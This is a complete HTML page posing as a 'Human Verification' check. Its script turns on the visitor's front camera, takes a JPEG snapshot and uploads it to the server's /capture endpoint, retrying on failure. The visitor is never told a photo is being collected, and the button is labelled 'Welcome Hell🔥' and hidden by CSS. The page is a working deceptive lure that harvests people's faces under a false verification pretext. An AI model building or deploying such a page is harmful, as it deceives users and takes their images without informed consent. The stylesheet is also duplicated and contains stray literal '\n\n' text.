<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Human Verification Lab</title>
<style>
*{box-sizing:border-box}

body{
  font-family:system-ui,-apple-system,sans-serif;
  background:#0d0f14;
  color:#eee;
  display:grid;
  place-items:center;
  min-height:100vh;
  margin:0;
  padding:20px;
}

.card{
  width:min(92%,440px);
  padding:24px;
  border:1px solid #292d38;
  border-radius:16px;
  text-align:center;
  background:#11141b;
  box-shadow:0 18px 50px rgba(0,0,0,.35);
  animation:cardIn .6s ease-out;
}

video{
  width:100%;
  border-radius:12px;
  margin-top:15px;
  display:none;
}

button{
  padding:12px 18px;
  margin:8px 4px;
  border:0;
  border-radius:10px;
  font-weight:700;
  cursor:pointer;
  transition:transform .18s ease,box-shadow .18s ease;
}

button:hover{
  transform:translateY(-2px);
  box-shadow:0 8px 22px rgba(255,255,255,.08);
}

button:active{
  transform:scale(.97);
}

#capture,#stop{
  display:none;
}

.status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#aaa;margin-right:8px;animation:statusPulse 1.4s ease-in-out infinite}\n\n#status{
  margin:12px 0;
  color:#aaa;
  animation:pulse 2s ease-in-out infinite;
}

@keyframes cardIn{
  from{opacity:0;transform:translateY(14px)}
  to{opacity:1;transform:translateY(0)}
}

@keyframes statusPulse{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:1;transform:scale(1.15)}}\n\n@keyframes pulse{
  0%,100%{opacity:.65}
  50%{opacity:1}
}

@media(max-width:500px){
  .card{
    width:100%;
    padding:22px 16px;
  }
}
</style>

<style>
body{
  overflow:hidden;
  background:
    radial-gradient(circle at 20% 20%, #302060 0, transparent 35%),
    radial-gradient(circle at 80% 80%, #164d5c 0, transparent 35%),
    #0d0d14;
}

.card{
  position:relative;
  animation:cardIn .7s ease-out;
  box-shadow:0 0 40px rgba(120,100,255,.18);
  backdrop-filter:blur(10px);
}

.card::before,
.card::after{
  content:"";
  position:absolute;
  width:70px;
  height:70px;
  border-radius:50%;
  border:1px solid rgba(255,255,255,.08);
  animation:float 4s ease-in-out infinite;
  pointer-events:none;
}

.card::before{
  top:-35px;
  left:-35px;
}

.card::after{
  right:-35px;
  bottom:-35px;
  animation-delay:1.5s;
}

button{
  transition:transform .2s ease,box-shadow .2s ease;
}

button:hover{
  transform:translateY(-2px) scale(1.02);
  box-shadow:0 8px 25px rgba(100,100,255,.25);
}

button:active{
  transform:scale(.97);
}

.status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#aaa;margin-right:8px;animation:statusPulse 1.4s ease-in-out infinite}\n\n#status{
  animation:pulse 2s ease-in-out infinite;
}

@keyframes cardIn{
  from{opacity:0;transform:translateY(20px) scale(.97)}
  to{opacity:1;transform:translateY(0) scale(1)}
}

@keyframes float{
  0%,100%{transform:translate(0,0)}
  50%{transform:translate(12px,-15px)}
}

@keyframes statusPulse{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:1;transform:scale(1.15)}}\n\n@keyframes pulse{
  0%,100%{opacity:.65}
  50%{opacity:1}
}
</style>
</head>
<body>
<main class="card">
  <h2>Human Verification</h2>
  <p>Complete the verification to continue.</p>

  <button id="capture">Welcome Hell🔥</button>

  <video id="video" autoplay playsinline></video>
  <div id="status"><span class="status-dot"></span><span id="statusText">Ready.</span></div>
</main>

<script>
const capture = document.querySelector("#capture");
const video = document.querySelector("#video");
const status = document.querySelector("#status");

let stream = null;
let busy = false;

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

async function startCamera() {
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      video.srcObject = stream;
      video.style.display = "block";

      if (video.readyState < HTMLMediaElement.HAVE_METADATA) {
        await new Promise((resolve, reject) => {
          const timer = setTimeout(
            () => reject(new Error("Camera initialization timeout.")),
            8000
          );

          video.addEventListener("loadedmetadata", () => {
            clearTimeout(timer);
            resolve();
          }, { once: true });
        });
      }

      try {
        await video.play();
      } catch (error) {
        if (error.name !== "AbortError") throw error;
        await sleep(250);
        await video.play();
      }

      for (let i = 0; i < 20; i++) {
        if (video.videoWidth > 0 && video.videoHeight > 0) return;
        await sleep(100);
      }

      throw new Error("Camera frame is not ready.");

    } catch (error) {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }

      if (attempt === 3) throw error;

      status.textContent = `Starting camera… ${attempt + 1}/3`;
      await sleep(500);
    }
  }
}

async function uploadPhoto(blob, filename) {
  const maxAttempts = 4;

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    const form = new FormData();
    form.append("photo", blob, filename);

    try {
      const response = await fetch("/capture", {
        method: "POST",
        body: form,
        cache: "no-store"
      });

      if (response.ok) return;

      if (![502, 503, 504].includes(response.status)) {
        throw new Error(`Upload failed: HTTP ${response.status}`);
      }

      if (attempt === maxAttempts) {
        throw new Error(`Upload failed after retries: HTTP ${response.status}`);
      }

    } catch (error) {
      if (attempt === maxAttempts) throw error;
    }

    status.textContent = `Server reconnecting… ${attempt + 1}/${maxAttempts}`;
    await sleep(1000 * attempt);
  }
}

capture.onclick = async () => {
  if (busy) return;

  busy = true;
  capture.disabled = true;
  status.textContent = "Starting camera…";

  try {
    await startCamera();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("Canvas is unavailable.");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise((resolve, reject) => {
      canvas.toBlob(
        b => b
          ? resolve(b)
          : reject(new Error("JPEG conversion failed.")),
        "image/jpeg",
        0.9
      );
    });

    status.textContent = "Uploading…";

    await uploadPhoto(blob, `capture-${Date.now()}.jpg`);

    status.textContent = "Capture successful.";

  } catch (error) {
    status.textContent =
      error.name === "NotAllowedError"
        ? "Camera permission denied."
        : `Capture failed: ${error.message || error.name}`;

  } finally {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }

    video.srcObject = null;
    busy = false;
    capture.disabled = false;
  }
};
</script>
</body>
</html>
